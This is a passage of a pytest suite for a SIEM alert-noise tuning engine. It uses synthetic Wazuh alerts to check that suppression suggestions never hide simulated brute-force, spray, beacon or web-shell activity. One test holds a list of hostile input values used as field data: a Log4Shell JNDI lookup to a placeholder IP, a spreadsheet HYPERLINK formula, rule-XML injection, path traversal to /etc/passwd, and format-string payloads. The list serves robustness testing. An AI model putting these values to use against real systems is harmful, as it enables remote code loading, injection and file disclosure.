"""Noise engine end to end, including the adversarial "never tune away the attack" suite.

Every event is synthetic and Wazuh-4-shaped (flattened alerts.json documents): RFC 5737 addresses are public,
RFC 1918 ones internal, hosts are *.example names and users are fake (alice, svc_backup...).
"""

from __future__ import annotations

import itertools
import json
import random
from collections.abc import Callable, Iterable, Iterator
from dataclasses import dataclass
from datetime import date, datetime, timedelta, timezone
from typing import Any

import pytest

from hushwatch import i18n
from hushwatch.analysis.dispositions import Dispositions
from hushwatch.analysis.noise import NoiseCollector, NoiseResult, analyze_noise, apply_backtest
from hushwatch.config import TenantConfig
from hushwatch.i18n import Entity, Message
from hushwatch.models import Event, Finding, iter_entities
from hushwatch.tuning import Suggestion

UTC = timezone.utc
END = datetime(2026, 9, 21, 23, 0, tzinfo=UTC)
START = END - timedelta(days=21)


@dataclass(frozen=True)
class Rule:
    id: str
    level: int
    groups: tuple[str, ...]
    tactics: tuple[str, ...] = ()
    mitre: tuple[str, ...] = ()
    description: str = ""
    decoder: str = "sshd"
    location: str = "/var/log/auth.log"


SSHD_INVALID = Rule(
    "5710",
    5,
    ("syslog", "sshd", "authentication_failed", "invalid_login"),
    ("Credential Access", "Lateral Movement"),
    ("T1110.001", "T1021.004"),
    "sshd: Attempt to login using a non-existent user",
)
SSHD_BRUTE = Rule(
    "5712",
    10,
    ("syslog", "sshd", "authentication_failures"),
    ("Credential Access",),
    ("T1110",),
    "sshd: brute force trying to get access to the system. Non existent user.",
)
WIN_LOGON = Rule(
    "60106",
    3,
    ("windows", "windows_security", "authentication_success"),
    ("Defense Evasion", "Persistence", "Privilege Escalation", "Initial Access"),
    ("T1078",),
    "Windows Logon Success",
    "windows_eventchannel",
    "EventChannel",
)
TASK = Rule(
    "100200", 8, ("local", "scheduled_task"), (), (), "Scheduled task executed", "windows_eventchannel", "EventChannel"
)
WEB_400 = Rule(
    "31101", 5, ("web", "accesslog"), (), (), "Web server 400 error code.", "web-accesslog", "/var/log/nginx/access.log"
)
WEB_ATTACK = Rule(
    "100900",
    12,
    ("web", "attack"),
    ("Initial Access",),
    ("T1190",),
    "Web shell activity",
    "web-accesslog",
    "/var/log/nginx/access.log",
)
FIM = Rule(
    "550",
    7,
    ("ossec", "syscheck", "syscheck_entry_modified", "syscheck_file"),
    ("Impact",),
    ("T1565.001",),
    "Integrity checksum changed.",
    "syscheck_integrity_changed",
    "syscheck",
)
DEFENDER = Rule(
    "62123",
    12,
    ("windows", "windows_defender"),
    (),
    (),
    "Windows Defender: potentially unwanted software",
    "windows_eventchannel",
    "EventChannel",
)
NET_CONN = Rule(
    "100310",
    8,
    ("sysmon", "sysmon_event3"),
    (),
    (),
    "Sysmon: network connection from a user profile",
    "windows_eventchannel",
    "EventChannel",
)

TENANT = TenantConfig(trusted_entities={"user": ["svc_backup"], "data.srcip": ["10.20.0.15"]})
_SEQ = itertools.count(1)


def alert(
    rule: Rule,
    ts: datetime,
    agent: str,
    *,
    agent_id: str = "001",
    data: dict[str, Any] | None = None,
    win: dict[str, Any] | None = None,
    extra: dict[str, Any] | None = None,
    event_id: str | None = None,
    level: int | None = None,
) -> Event:
    """A flattened Wazuh 4.x alert."""
    eid = event_id or f"{int(ts.timestamp())}.{next(_SEQ)}"
    lvl = rule.level if level is None else level
    fields: dict[str, Any] = {
        "timestamp": ts.strftime("%Y-%m-%dT%H:%M:%S.000+0000"),
        "rule.id": rule.id,
        "rule.level": lvl,
        "rule.description": rule.description,
        "rule.groups": list(rule.groups),
        "rule.mitre.id": list(rule.mitre),
        "rule.mitre.tactic": list(rule.tactics),
        "agent.id": agent_id,
        "agent.name": agent,
        "manager.name": "wazuh-manager",
        "id": eid,
        "decoder.name": rule.decoder,
        "location": rule.location,
    }
    for key, value in (data or {}).items():
        fields[f"data.{key}"] = value
    for key, value in (win or {}).items():
        fields[f"data.win.eventdata.{key}"] = value
    fields.update(extra or {})
    return Event(
        ts=ts,
        rule_id=rule.id,
        rule_name=rule.description,
        severity=lvl,
        source=agent,
        log_source=rule.location,
        fields=fields,
        tags=rule.mitre + tuple(f"group:{g}" for g in rule.groups),
        event_id=eid,
        rule_groups=rule.groups,
        mitre_tactics=rule.tactics,
    )


def every(start: datetime, end: datetime, step: timedelta, *, jitter: int = 0, seed: int = 0) -> Iterator[datetime]:
    rng = random.Random(seed)
    t = start
    while t < end:
        yield t + timedelta(seconds=rng.randint(0, jitter)) if jitter else t
        t += step


def run(
    events: list[Event],
    *,
    tenant: TenantConfig = TENANT,
    dispositions: Dispositions | None = None,
    dependents: Callable[[str], tuple[str, ...]] | None = None,
    now: datetime = END,
    profile: str = "wazuh4",
) -> NoiseResult:
    events = sorted(events, key=lambda e: e.ts)
    collector = NoiseCollector(tenant, profile, dispositions)
    for event in events:
        collector.add(event)
    result = analyze_noise(collector, tenant=tenant, now=now, dependents=dependents)
    return apply_backtest(result, events, tenant=tenant)


def with_value(result: NoiseResult, value: str, rule: str | None = None) -> list[Suggestion]:
    return [
        s
        for s in result.suggestions
        if any(c.value == value for c in s.conditions) and (rule is None or s.rule_id == rule)
    ]


def tune(result: NoiseResult) -> list[Suggestion]:
    return [s for s in result.suggestions if s.verdict == "tune"]


def finding_for(result: NoiseResult, suggestion: Suggestion) -> Finding:
    matches = [f for f in result.findings if f.evidence.get("suggestion") == suggestion.fingerprint]
    assert len(matches) == 1, [f.kind for f in result.findings]
    return matches[0]


def assert_never_hidden(result: NoiseResult, attack: Iterable[Event]) -> None:
    attack = list(attack)
    for suggestion in tune(result):
        hidden = [e for e in attack if suggestion.matches(e)]
        assert hidden == [], f"tune suggestion {suggestion.conditions} hides {len(hidden)} attack events"


def render_everything(result: NoiseResult) -> None:
    """Every message renders in EN and ES, placeholders resolved, section/evidence JSON-serializable."""
    for finding in result.findings:
        for lang in ("en", "es"):
            for msg in (finding.title, finding.recommendation, *finding.reasons):
                text = i18n.render(msg, lang)
                assert "{" not in text or "}" not in text.split("{", 1)[1], text
        json.dumps(finding.evidence, default=_json_default)
    for suggestion in result.suggestions:
        for reason in suggestion.reasons:
            i18n.render(reason, "es")
    json.dumps(result.section, default=_json_default)


def _json_default(value: Any) -> Any:
    if isinstance(value, Entity):
        return {"kind": value.kind, "value": value.value}
    raise TypeError(type(value))


def assert_entities_wrapped(finding: Finding, raw_values: Iterable[str]) -> None:
    """No identifying value appears as a bare string in evidence or message params."""
    wrapped = {
        e.value for e in iter_entities([finding.evidence, finding.title, finding.recommendation, *finding.reasons])
    }

    def walk(value: Any) -> Iterator[str]:
        if isinstance(value, str):
            yield value
        elif isinstance(value, Message):
            for v in value.params.values():
                yield from walk(v)
        elif isinstance(value, dict):
            for v in value.values():
                yield from walk(v)
        elif isinstance(value, (list, tuple)):
            for v in value:
                yield from walk(v)

    bare = set(walk([finding.evidence, finding.title, finding.recommendation, *finding.reasons]))
    for raw in raw_values:
        if raw in wrapped or raw in bare:
            assert raw not in bare, f"{raw!r} leaks unwrapped"


# ---- datasets ----------------------------------------------------------------------------------------------------
def service_automation(
    rule: Rule = TASK, *, host: str = "srv-backup-01.corp.example", step_minutes: int = 15
) -> list[Event]:
    return [
        alert(
            rule,
            t,
            host,
            agent_id="002",
            win={"subjectUserName": "svc_backup", "targetUserName": "svc_backup", "logonType": "5"},
            extra={"data.win.system.providerName": "Microsoft-Windows-Security-Auditing"},
        )
        for t in every(START, END, timedelta(minutes=step_minutes), jitter=90, seed=1)
    ]


def human_background(rule: Rule, *, per_day: int = 10, seed: int = 2) -> list[Event]:
    rng = random.Random(seed)
    out = []
    for day in range(21):
        for _ in range(per_day):
            user = rng.choice(["alice", "bob", "carol"])
            ts = START + timedelta(days=day, hours=rng.uniform(7, 19))
            out.append(alert(rule, ts, f"ws-{rng.randint(1, 30):02d}.corp.example", win={"targetUserName": user}))
    return out


# ---- (1) benign service-account automation -> tune ---------------------------------------------------------------
def test_1_service_account_automation_is_tuned() -> None:
    events = service_automation() + human_background(TASK)
    result = run(events)
    render_everything(result)
    tuned = tune(result)
    assert len(tuned) == 1, [(s.conditions, s.verdict) for s in result.suggestions]
    suggestion = tuned[0]
    assert {(c.field, c.value) for c in suggestion.conditions} in (
        {("agent.name", "srv-backup-01.corp.example"), ("data.win.eventdata.subjectUserName", "svc_backup")},
        # a target account is always pinned with its logon type (a batch logon never hides an RDP one)
        {
            ("agent.name", "srv-backup-01.corp.example"),
            ("data.win.eventdata.targetUserName", "svc_backup"),
            ("data.win.eventdata.logonType", "5"),
        },
    )
    assert suggestion.action == "demote" and suggestion.expires == date(2026, 12, 20)
    automation = [e for e in events if e.fields["agent.name"] == "srv-backup-01.corp.example"]
    assert suggestion.hidden_total == len(automation)
    assert not any(suggestion.matches(e) for e in events if e not in automation)
    assert 1 <= len(suggestion.examples) <= 3
    finding = finding_for(result, suggestion)
    assert finding.kind == "noise.tune" and finding.severity.value == "medium" and finding.domain == "noise"
    assert finding.subject.startswith("rule:100200|")
    assert finding.evidence["backtest"]["hidden"] == len(automation)
    assert finding.evidence["time_saved_minutes_per_day"][0] > 0
    assert_entities_wrapped(finding, ["srv-backup-01.corp.example", "svc_backup"])
    section = result.section
    assert section["time_saved_minutes_per_day"] is not None and section["time_saved_kind"] == "upper_bound_estimate"
    assert result.backtested


def test_1b_sensitive_rule_needs_fp_evidence() -> None:
    """The same automation under a sensitive-tactic rule (logon success) is only tuned with FP dispositions."""
    events = service_automation(WIN_LOGON) + human_background(WIN_LOGON)
    without = run(events)
    anchored = with_value(without, "svc_backup")
    assert anchored and all(s.verdict == "investigate" for s in anchored)
    assert tune(without) == []
    ids = [e.event_id for e in events if e.fields["agent.name"] == "srv-backup-01.corp.example"][:30]
    disp = Dispositions.from_rows([{"alert_id": i, "verdict": "btp"} for i in ids if i])
    with_evidence = run(events, dispositions=disp)
    tuned = tune(with_evidence)
    assert len(tuned) == 1 and any(c.value == "svc_backup" for c in tuned[0].conditions)
    finding = finding_for(with_evidence, tuned[0])
    assert finding.confidence.value == "high"
    assert finding.severity.value == "low"  # level 3 is below the triage level: index noise only
    assert finding.evidence["dispositions"]["fp_lower_bound"] >= 0.8


# ---- (2) brute force from a NEW public IP inside a noisy 5710 ----------------------------------------------------
def _scanner_noise() -> list[Event]:
    events = []
    for i, t in enumerate(every(START, END, timedelta(minutes=15), jitter=60, seed=3)):
        host = f"srv-app-{i % 4 + 1:02d}.corp.example"
        events.append(
            alert(SSHD_INVALID, t, host, data={"srcip": "10.20.0.15", "srcuser": ["admin", "test", "oracle"][i % 3]})
        )
    return events


def _brute_force(
    ip: str = "203.0.113.66", host: str = "srv-web-01.example", days: int = 2
) -> tuple[list[Event], list[Event]]:
    rng = random.Random(5)
    attack, correlated = [], []
    for n, t in enumerate(every(END - timedelta(days=days), END, timedelta(seconds=240), jitter=30, seed=6)):
        user = rng.choice(["admin", "root", "postgres", "ubuntu", "test", "deploy"]) + str(rng.randint(0, 99))
        attack.append(alert(SSHD_INVALID, t, host, data={"srcip": ip, "srcuser": user, "srcport": str(40000 + n)}))
        if n % 8 == 7:
            correlated.append(alert(SSHD_BRUTE, t, host, data={"srcip": ip}))
    return attack, correlated


def test_2_new_brute_force_is_never_tuned_and_never_hidden() -> None:
    scanner = _scanner_noise()
    attack, correlated = _brute_force()
    ids = [e.event_id for e in scanner[:40]]
    disp = Dispositions.from_rows([{"alert_id": i, "verdict": "btp"} for i in ids if i])
    result = run(scanner + attack + correlated, dispositions=disp)
    render_everything(result)
    attacker = with_value(result, "203.0.113.66", rule="5710")
    assert attacker, "the brute force must be surfaced"
    assert all(s.verdict in ("investigate", "fix_at_source") for s in attacker)
    finding = finding_for(result, attacker[0])
    assert finding.kind == "noise.investigate" and finding.severity.value == "high"  # linked to 5712 (level 10)
    keys = {r.key for r in finding.reasons if isinstance(r, Message)}
    assert {"noise.reason.novel", "noise.reason.co_occurrence"} <= keys
    assert_entities_wrapped(finding, ["203.0.113.66", "srv-web-01.example"])
    # the scanner is a legitimate, evidenced tuning candidate... whose backtest hides none of the attack
    scanner_suggestions = [s for s in tune(result) if any(c.value == "10.20.0.15" for c in s.conditions)]
    assert scanner_suggestions
    assert_never_hidden(result, attack + correlated)
    # the correlation rule itself (level 10) is never tunable
    brute = [f for f in result.findings if f.subject == "rule:5712"]
    assert brute and brute[0].kind == "noise.do_not_tune"


# ---- (3) password spray: many users, one public IP ---------------------------------------------------------------
def test_3_password_spray_is_never_tuned() -> None:
    rng = random.Random(9)
    burst = [
        alert(
            SSHD_INVALID,
            t,
            "srv-mail-01.example",
            data={"srcip": "198.51.100.44", "srcuser": f"user{rng.randint(0, 5000)}"},
        )
        for t in every(END - timedelta(hours=20), END, timedelta(seconds=90), seed=10)
    ]
    slow = [
        alert(
            SSHD_INVALID,
            START + timedelta(days=d, hours=h * 4 + 1),
            "srv-mail-02.example",
            data={"srcip": "198.51.100.45", "srcuser": f"u{d}{h}"},
        )
        for d in range(21)
        for h in range(5)
    ]
    background = _scanner_noise()[:200]
    result = run(burst + background)
    render_everything(result)
    fast = with_value(result, "198.51.100.44")
    assert fast and all(s.verdict == "investigate" for s in fast)
    # a chronic spray (same public IP every day, new usernames each time) in its own dataset
    chronic_result = run(slow + background)
    render_everything(chronic_result)
    chronic = with_value(chronic_result, "198.51.100.45")
    assert chronic and all(s.verdict in ("investigate", "fix_at_source") for s in chronic)
    assert any(s.verdict == "fix_at_source" for s in chronic)  # a chronic public source: restrict exposure
    chronic_finding = finding_for(chronic_result, next(s for s in chronic if s.verdict == "fix_at_source"))
    assert chronic_finding.kind == "noise.fix_at_source"
    assert isinstance(chronic_finding.title, Message)
    assert chronic_finding.title.key == "noise.title.fix_at_source.exposure"
    assert_never_hidden(chronic_result, slow)
    assert not any(c.field.endswith("srcuser") for s in result.suggestions for c in s.conditions)
    assert_never_hidden(result, burst + slow)


# ---- (4) periodic beacon to a public IP --------------------------------------------------------------------------
def test_4_beacon_every_five_minutes_is_investigated() -> None:
    beacon = [
        alert(
            NET_CONN,
            t,
            "ws-07.corp.example",
            win={
                "image": "C:\\\\Users\\\\alice\\\\AppData\\\\Local\\\\Temp\\\\updater.exe",
                "destinationIp": "198.51.100.77",
                "destinationPort": "443",
            },
        )
        for t in every(START, END, timedelta(minutes=5), jitter=20, seed=11)
    ]
    rng = random.Random(12)
    background = [
        alert(
            NET_CONN,
            START + timedelta(days=rng.uniform(0, 21)),
            f"ws-{rng.randint(10, 40):02d}.corp.example",
            win={
                "image": "C:\\\\Program Files\\\\Browser\\\\browser.exe",
                "destinationIp": f"192.0.2.{rng.randint(1, 250)}",
            },
        )
        for _ in range(800)
    ]
    result = run(beacon + background)
    render_everything(result)
    on_host = with_value(result, "ws-07.corp.example")
    assert on_host and all(s.verdict == "investigate" for s in on_host)
    reasons = {r.key for s in on_host for r in s.reasons if isinstance(r, Message)}
    assert reasons & {"noise.reason.beacon", "noise.backtest.beacon"}
    assert_never_hidden(result, beacon)


# ---- (5) slow-burn attacker co-occurring with a level-12 alert ---------------------------------------------------
def test_5_slow_burn_entity_linked_to_high_alert_is_investigated() -> None:
    slow_burn = [
        alert(WEB_400, t, "srv-web-01.example", data={"srcip": "10.0.5.23", "url": f"/admin/{i % 7}"})
        for i, t in enumerate(every(START, END, timedelta(minutes=45), jitter=300, seed=13))
    ]
    scanner = [
        alert(WEB_400, t, "srv-web-01.example", data={"srcip": "10.20.0.15", "url": "/health"})
        for t in every(START, END, timedelta(minutes=30), jitter=60, seed=14)
    ]
    high = [
        alert(WEB_ATTACK, START + timedelta(days=15, hours=3), "srv-intranet-01.example", data={"srcip": "10.0.5.23"})
    ]
    result = run(slow_burn + scanner + high)
    render_everything(result)
    suspect = with_value(result, "10.0.5.23", rule="31101")
    assert suspect and all(s.verdict == "investigate" for s in suspect)
    finding = finding_for(result, suspect[0])
    assert finding.severity.value == "high" and finding.title.key == "noise.title.investigate_high"
    benign = with_value(result, "10.20.0.15", rule="31101")
    assert benign and benign[0].verdict == "tune"
    assert_never_hidden(result, slow_burn + high)


# ---- (6) FIM noise on a log path -> fix_at_source ----------------------------------------------------------------
def test_6_fim_log_path_noise_is_fixed_at_source() -> None:
    fim = [
        alert(
            FIM,
            t,
            "srv-app-01.corp.example",
            extra={"syscheck.path": "/var/log/app/app.log", "syscheck.event": "modified"},
        )
        for t in every(START, END, timedelta(hours=1), jitter=120, seed=15)
    ]
    result = run(fim)
    render_everything(result)
    suggestions = with_value(result, "/var/log/app/app.log")
    assert suggestions and all(s.verdict == "fix_at_source" for s in suggestions)
    finding = finding_for(result, suggestions[0])
    assert finding.kind == "noise.fix_at_source" and finding.title.key == "noise.title.fix_at_source.fim"
    assert tune(result) == []


# ---- (7) a noisy level-12 rule is never tunable ------------------------------------------------------------------
def test_7_noisy_level_12_rule_is_do_not_tune() -> None:
    noisy = [
        alert(DEFENDER, t, "ws-03.corp.example", win={"threat Name": "PUA:Win32/Toolbar"})
        for t in every(START, END, timedelta(minutes=20), seed=16)
    ]
    result = run(noisy)
    render_everything(result)
    assert result.suggestions and all(s.verdict == "do_not_tune" for s in result.suggestions)
    rule_finding = next(f for f in result.findings if f.subject == "rule:62123")
    assert rule_finding.kind == "noise.do_not_tune" and rule_finding.severity.value == "info"
    assert next(r for r in result.section["rules"] if r["rule_id"] == "62123")["verdict"] == "do_not_tune"


# ---- (8) a TP disposition on the candidate scope blocks tuning ---------------------------------------------------
def test_8_true_positive_disposition_blocks_tuning() -> None:
    events = service_automation() + human_background(TASK)
    one = next(e for e in events if e.fields["agent.name"] == "srv-backup-01.corp.example")
    disp = Dispositions.from_rows([{"alert_id": one.event_id, "verdict": "true_positive", "closed_at": "2026-09-10"}])
    result = run(events, dispositions=disp)
    render_everything(result)
    blocked = with_value(result, "svc_backup")
    assert blocked and all(s.verdict == "do_not_tune" for s in blocked)
    finding = finding_for(result, blocked[0])
    assert finding.kind == "noise.do_not_tune" and finding.severity.value == "low"
    scoped = Dispositions.from_rows(
        [{"rule_id": "100200", "field": "data.win.eventdata.subjectUserName", "value": "svc_backup", "verdict": "tp"}]
    )
    scoped_result = run(events, dispositions=scoped)
    assert with_value(scoped_result, "svc_backup")
    assert not any(any(c.value == "svc_backup" for c in s.conditions) for s in tune(scoped_result))


# ---- (9) less than min_history_days -> learning ------------------------------------------------------------------
def test_9_short_history_is_learning() -> None:
    events = [e for e in service_automation() if e.ts >= END - timedelta(days=5)]
    result = run(events)
    render_everything(result)
    assert result.suggestions and all(s.verdict == "learning" for s in result.suggestions)
    assert [f.kind for f in result.findings] == ["assessment.learning"]
    # a short input is not a failed analysis (no exit code 3): the section is "not_assessed", never green
    assert result.findings[0].severity.value == "low"
    assert result.section["status"] == "not_assessed" and result.section["learning"] is True
    assert all(r["verdict"] == "learning" for r in result.section["rules"])


# ---- (10) a burst day -> investigate -----------------------------------------------------------------------------
def test_10_burst_day_is_investigated() -> None:
    events = service_automation()
    burst_day = END - timedelta(days=4)
    events += [
        alert(
            TASK,
            burst_day + timedelta(seconds=20 * i),
            "srv-backup-01.corp.example",
            agent_id="002",
            win={"subjectUserName": "svc_backup", "targetUserName": "svc_backup"},
        )
        for i in range(1000)
    ]
    result = run(events)
    render_everything(result)
    anchored = with_value(result, "svc_backup")
    assert anchored and all(s.verdict == "investigate" for s in anchored)
    keys = {r.key for s in anchored for r in s.reasons if isinstance(r, Message)}
    assert "noise.reason.burst" in keys


# ---- (11) a rule other rules correlate on -> review --------------------------------------------------------------
def test_11_rule_with_dependents_requires_review() -> None:
    events = service_automation() + human_background(TASK)
    calls: list[str] = []

    def dependents(rule_id: str) -> tuple[str, ...]:
        calls.append(rule_id)
        return ("100201", "100250") if rule_id == "100200" else ()

    result = run(events, dependents=dependents)
    tuned = tune(result)
    assert tuned and all(s.action == "review" and s.review_required for s in tuned)
    assert tuned[0].dependents == ("100201", "100250")
    finding = finding_for(result, tuned[0])
    assert finding.recommendation is not None and isinstance(finding.recommendation, Message)
    assert finding.recommendation.key == "noise.rec.tune_review"
    assert "100200" in calls

    def broken(rule_id: str) -> tuple[str, ...]:
        raise RuntimeError("ruleset parse error")

    assert all(s.action == "review" for s in run(events, dependents=broken).suggestions)


# ---- (12) hostile values -----------------------------------------------------------------------------------------
HOSTILE = [
    '</field></rule><rule id="100999" level="0"><if_sid>1</if_sid>',
    "]]><!--",
    "[bold red]pwned[/bold red][link=http://198.51.100.1]x[/link]",
    "\x1b[2J\x1b[31mred",
    '=HYPERLINK("http://198.51.100.1","x")',
    "${jndi:ldap://198.51.100.1/a}",
    ".*|^$(?:x+)+",
    "{0}{name}{__class__}%s%n",
    "../../etc/passwd",
    "\ud800\udfff\u202e",
    "<!channel> @here",
    "a|b\\c:d",
]


def test_12_hostile_values_do_not_crash_and_stay_exact() -> None:
    rng = random.Random(17)
    events: list[Event] = []
    for i, t in enumerate(every(START, END, timedelta(minutes=30), seed=18)):
        payload = HOSTILE[i % len(HOSTILE)]
        events.append(
            alert(
                TASK,
                t,
                HOSTILE[0],  # the host name itself is hostile
                win={
                    "subjectUserName": "svc_backup",
                    "targetUserName": payload,
                    "commandLine": "A" * 1_000_000 if i % 50 == 0 else payload,
                    "image": [payload, {"nested": payload}, None, True, 3.5],
                },
                data={"url": payload, "srcip": payload},
                extra={
                    "rule.description": HOSTILE[3],
                    "predecoder.hostname": {"not": "a string"},
                    "location": ["x", 1],
                },
            )
        )
    weird = [
        Event(ts=START + timedelta(hours=1), rule_id="100200", severity="high", fields={"agent.name": None}),  # type: ignore[arg-type]
        Event(ts=START + timedelta(hours=2), rule_id="../../etc", severity=True, fields={}),  # type: ignore[arg-type]
        Event(ts=START + timedelta(hours=3), rule_id=None, fields={"agent.name": "x"}),
        Event(ts=START + timedelta(hours=4), rule_id="100200", severity=5, fields={"agent": {"name": HOSTILE[2]}}),
    ]
    events += weird + [alert(TASK, START + timedelta(days=rng.randint(0, 20)), "ws-01.corp.example") for _ in range(50)]
    result = run(events, profile="auto")
    render_everything(result)
    for suggestion in result.suggestions:
        for cond in suggestion.conditions:
            assert len(cond.value) <= 1024  # a 1 MB value never becomes a condition
    host_scoped = [s for s in result.suggestions if any(c.value == HOSTILE[0] for c in s.conditions)]
    assert host_scoped, "hostile values are kept verbatim (exact match), never interpreted"
    for suggestion in host_scoped:
        assert any(suggestion.matches(e) for e in events)
    for finding in result.findings:
        assert_entities_wrapped(finding, [HOSTILE[0]])


def test_12b_hostile_message_rendering_never_formats_payloads() -> None:
    events = service_automation(host="{__class__.__mro__}")
    result = run(events)
    for finding in result.findings:
        for lang in ("en", "es"):
            text = i18n.render(finding.title, lang)
            assert "{__class__.__mro__}" in text  # the payload is data, never a format string


# ---- engine behaviour --------------------------------------------------------------------------------------------
def test_nothing_is_tuned_without_a_backtest() -> None:
    events = service_automation()
    collector = NoiseCollector(TENANT, "wazuh4")
    for event in events:
        collector.add(event)
    result = analyze_noise(collector, tenant=TENANT, now=END)
    assert not result.backtested
    assert result.suggestions and all(s.verdict != "tune" for s in result.suggestions)
    assert any(s.verdict == "watch" for s in result.suggestions)
    incomplete = [f for f in result.findings if f.kind == "assessment.incomplete"]
    assert len(incomplete) == 1 and incomplete[0].severity.value == "medium"
    assert result.section["time_saved_minutes_per_day"] is None

    def vanishing() -> Iterator[Event]:
        raise OSError("input file rotated away")
        yield  # pragma: no cover

    failed = apply_backtest(result, vanishing(), tenant=TENANT)
    assert not failed.backtested and tune(failed) == []
    assert any(f.kind == "assessment.incomplete" for f in failed.findings)
    done = apply_backtest(result, events, tenant=TENANT)
    again = apply_backtest(done, events, tenant=TENANT)
    assert [s.verdict for s in done.suggestions] == [s.verdict for s in again.suggestions]
    assert tune(done) and not any(f.kind == "assessment.incomplete" for f in done.findings)
    assert [s.verdict for s in result.suggestions] != [s.verdict for s in done.suggestions]  # input not mutated


def test_backtest_on_changed_input_does_not_tune() -> None:
    events = service_automation()
    collector = NoiseCollector(TENANT, "wazuh4")
    for event in events:
        collector.add(event)
    result = analyze_noise(collector, tenant=TENANT, now=END)
    emptied = apply_backtest(result, [], tenant=TENANT)
    assert emptied.backtested and tune(emptied) == []
    assert all(s.verdict != "tune" for s in emptied.suggestions)


def test_section_shape() -> None:
    events = service_automation() + human_background(TASK) + _scanner_noise()[:500]
    result = run(events)
    section = result.section
    assert section["status"] in ("ok", "warn", "fail")
    totals = section["totals"]
    assert set(totals) == {"alerts", "analyst_facing", "rules", "days", "clusters", "top5_share"}
    assert totals["alerts"] == len(events) and totals["rules"] == 2 and 20 < totals["days"] <= 21
    assert 0 < totals["clusters"] <= totals["alerts"] and totals["top5_share"] == 1.0
    rows = section["rules"]
    assert [r["analyst_facing"] for r in rows] == sorted((r["analyst_facing"] for r in rows), reverse=True)
    for row in rows:
        assert set(row) >= {
            "rule_id", "description", "level", "total", "per_day", "analyst_facing", "share", "clusters",
            "days_active", "days", "top_anchor", "verdict", "daily",
        }  # fmt: skip
        assert len(row["daily"]) == row["days"] and sum(row["daily"]) == row["total"]
        assert row["verdict"] in (
            "tune",
            "investigate",
            "fix_at_source",
            "aggregate",
            "do_not_tune",
            "watch",
            "learning",
        )
        assert row["top_anchor"] is None or isinstance(row["top_anchor"]["value"], Entity)
    low, high = section["time_saved_minutes_per_day"]
    assert 0 < low < high
    assert section["suppressions_file"] is None


def test_empty_and_archive_only_inputs() -> None:
    result = run([])
    assert result.suggestions == [] and result.findings == [] and result.section["status"] == "not_assessed"
    archives = [
        Event(ts=START + timedelta(hours=i), rule_id=None, fields={"agent.name": "srv-app-01.corp.example"})
        for i in range(10)
    ]
    result = run(archives)
    assert result.section["status"] == "not_assessed" and result.section["skipped_events"] == 10


def test_merge_equals_single_pass() -> None:
    events = sorted(service_automation() + human_background(TASK), key=lambda e: e.ts)
    single = run(events)
    left, right = NoiseCollector(TENANT, "wazuh4"), NoiseCollector(TENANT, "wazuh4")
    for i, event in enumerate(events):
        (left if i % 2 else right).add(event)
    left.merge(right)
    merged = apply_backtest(analyze_noise(left, tenant=TENANT, now=END), events, tenant=TENANT)
    assert [(s.fingerprint, s.verdict) for s in merged.suggestions] == [
        (s.fingerprint, s.verdict) for s in single.suggestions
    ]
    with pytest.raises(ValueError):
        left.merge(left)
    with pytest.raises(ValueError):
        left.merge(NoiseCollector(TenantConfig(name="other"), "wazuh4"))


def test_fingerprints_are_stable_and_tenant_scoped() -> None:
    events = service_automation()
    first = run(events)
    second = run(events)
    assert [s.fingerprint for s in first.suggestions] == [s.fingerprint for s in second.suggestions]
    other = run(events, tenant=TenantConfig(name="globex", trusted_entities=TENANT.trusted_entities))
    assert {s.fingerprint for s in first.suggestions}.isdisjoint(s.fingerprint for s in other.suggestions)


def test_auto_profile_and_late_profile_assignment() -> None:
    events = service_automation()
    auto = run(events, profile="auto")
    fixed = run(events, profile="wazuh4")
    assert [(s.conditions, s.verdict) for s in auto.suggestions] == [
        (s.conditions, s.verdict) for s in fixed.suggestions
    ]
    assert all(s.profile == "wazuh4" for s in auto.suggestions)
    collector = NoiseCollector(TENANT, "auto")
    for event in events:
        collector.add(event)
    collector.profile = "wazuh4"  # what the engine does once DataBasis knows the profile
    assert analyze_noise(collector, tenant=TENANT, now=END).suggestions[0].profile == "wazuh4"


def test_ecs_profile() -> None:
    events = []
    for t in every(START, END, timedelta(minutes=20), seed=19):
        fields = {
            "@timestamp": t.isoformat(),
            "kibana.alert.rule.uuid": "0f1e2d3c-rule",
            "kibana.alert.rule.name": "Scheduled task created",
            "host.name": "srv-backup-01.corp.example",
            "user.name": "svc_backup",
            "process.executable": "C:\\Windows\\System32\\schtasks.exe",
            "event.dataset": "windows.security",
        }
        events.append(
            Event(ts=t, rule_id="0f1e2d3c-rule", rule_name="Scheduled task created", severity=7, fields=fields)
        )
    result = run(events, profile="ecs")
    tuned = tune(result)
    assert tuned and tuned[0].profile == "ecs"
    assert {c.field for c in tuned[0].conditions} <= {"host.name", "user.name", "process.executable"}


def test_rule_cap_is_reported() -> None:
    collector = NoiseCollector(TENANT, "wazuh4", max_rules=1)
    collector.add(alert(TASK, START, "h1"))
    collector.add(alert(WEB_400, START, "h1"))
    collector.add(alert(WEB_ATTACK, START, "srv-web-01.example", data={"srcip": "10.0.5.23"}))
    result = analyze_noise(collector, tenant=TENANT, now=END)
    assert collector.rules_truncated and collector.dropped == 2
    # alerts of dropped rules still feed co-occurrence when they are high-level
    assert collector.high_index.hours("ip", "10.0.5.23")
    assert any(f.subject == "noise:rules-cap" and f.kind == "assessment.incomplete" for f in result.findings)


def test_bad_disposition_rows_are_reported() -> None:
    disp = Dispositions.from_rows([{"alert_id": "x", "verdict": "maybe"}])
    result = run(service_automation(), dispositions=disp)
    assert any(f.subject == "noise:dispositions" for f in result.findings)


def test_rule_wide_tuning_only_when_allowed() -> None:
    from hushwatch.config import NoiseSettings

    rng = random.Random(20)
    scattered = [
        alert(TASK, START + timedelta(days=d, hours=rng.uniform(0, 24)), f"srv-{rng.randint(1, 200):03d}.corp.example")
        for d in range(21)
        for _ in range(60)
    ]
    assert all(s.conditions for s in run(scattered).suggestions)
    allowed = TenantConfig(noise=NoiseSettings(allow_rule_wide=True))
    wide = [s for s in run(scattered, tenant=allowed).suggestions if not s.conditions]
    assert len(wide) == 1 and wide[0].verdict == "tune"
    assert wide[0].hidden_total == len(scattered)


def test_candidates_are_narrow_and_not_redundant() -> None:
    events = service_automation(WIN_LOGON)
    result = run(events)
    fields = [tuple(sorted(c.field for c in s.conditions)) for s in result.suggestions]
    # the host's own log channel, decoder or provider never masquerade as a narrower scope
    assert not any("decoder.name" in f or "location" in f or "data.win.system.providerName" in f for f in fields)
    assert len(result.suggestions) <= TENANT.noise.max_candidates_per_rule
    assert len(result.suggestions) == 1


def test_backtest_downgrades_what_the_gates_could_not_see() -> None:
